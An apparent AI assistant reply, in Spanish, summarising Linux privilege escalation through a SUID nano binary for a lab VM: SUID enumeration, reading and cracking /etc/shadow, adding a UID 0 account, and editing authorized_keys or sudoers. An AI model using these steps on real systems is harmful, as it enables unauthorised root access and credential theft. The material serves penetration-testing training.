Resumen operativo — SUID/SGID, enumeración y abuso con `nano` SUID

1.  Conceptos

- SUID (04000): el binario se ejecuta con el UID del dueño (p. ej., root).
- SGID (02000): el binario se ejecuta con el GID del grupo dueño.
- Indicador: permiso con “s” en la posición de usuario (SUID) o grupo (SGID).

2.  Enumeración

- Solo SUID:
    
    ```
    find / -type f -perm -04000 -ls 2>/dev/null
    ```
    
- Solo SGID:
    
    ```
    find / -type f -perm -02000 -ls 2>/dev/null
    ```
    
- Referencia de abusos:
    
    ```
    https://gtfobins.github.io/#+suid
    ```
    

3.  Caso práctico: `nano` con SUID  
    Objetivo: leer/escribir archivos como root. No da shell directa; permite saltos intermedios.

A) Vector 1 — Leer `/etc/shadow` y crackear

- Leer:
    
    ```
    nano /etc/shadow
    ```
    
    Copia su contenido a `shadow.txt`. Copia `/etc/passwd` a `passwd.txt`.
    
- Unificar y crackear con John:
    
    ```
    unshadow passwd.txt shadow.txt > hashes.txt
    john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
    john --show hashes.txt
    ```
    
- Con Hashcat (sha512crypt = modo 1800):
    
    ```
    # si extraes solo hashes $6$...
    hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
    hashcat -m 1800 hashes.txt --show
    ```
    

B) Vector 2 — Alta de usuario con UID 0 en `/etc/passwd`

- Generar hash sha512crypt de tu contraseña:
    
    ```
    openssl passwd -6 'TuClaveFuerte'
    ```
    
    Resultado: cadena que comienza con `$6$...`
    
- Editar `/etc/passwd` con `nano` SUID y añadir una línea:
    
    ```
    pwn:$6$SALTyHASH...:0:0:root:/root:/bin/bash
    ```
    
    Campos: usuario:hash:UID:GID:comentario:home:shell  
    Clave: UID=0 y GID=0 ⇒ privilegios de root.
    
- Cambiar a ese usuario:
    
    ```
    su pwn
    id
    ```
    

C) Alternativas viables con `nano` SUID (según políticas PAM/sudo)

- Escribir clave pública en `/root/.ssh/authorized_keys` (si permisos de ruta lo permiten).
- Editar archivos de servicio para inyectar comandos en arranque (riesgoso).
- Modificar `/etc/sudoers` o crear `/etc/sudoers.d/usuario` (requiere permisos 0440 y sintaxis válida; si no se respetan, `sudo` lo ignora).

4.  Comprobaciones y validación

- Verificar SUID en `nano`:
    
    ```
    ls -l $(which nano)
    # ejemplo: -rwsr-xr-x 1 root root ... /bin/nano   (la 's' en usuario)
    ```
    
- Confirmar que `nano` efectivamente escribe como root:
    
    ```
    nano /root/probe.txt
    ls -l /root/probe.txt   # owner root
    ```
    

5.  Consideraciones

- `find ... -perm -04000` lista SUID, no SGID.
- Mantén copias y no corrompas `/etc/passwd`/`/etc/shadow`. Un error de formato bloquea logins.
- Si el sistema usa shadow, un usuario con hash en `/etc/passwd` pero sin entrada en `/etc/shadow` suele funcionar; depende de PAM.

Si necesitas un flujo exacto para tu VM (desde descubrimiento de `nano` SUID hasta `su pwn`), indícame qué binarios adicionales con SUID aparecieron en tu `find` y te doy la cadena de explotación mínima.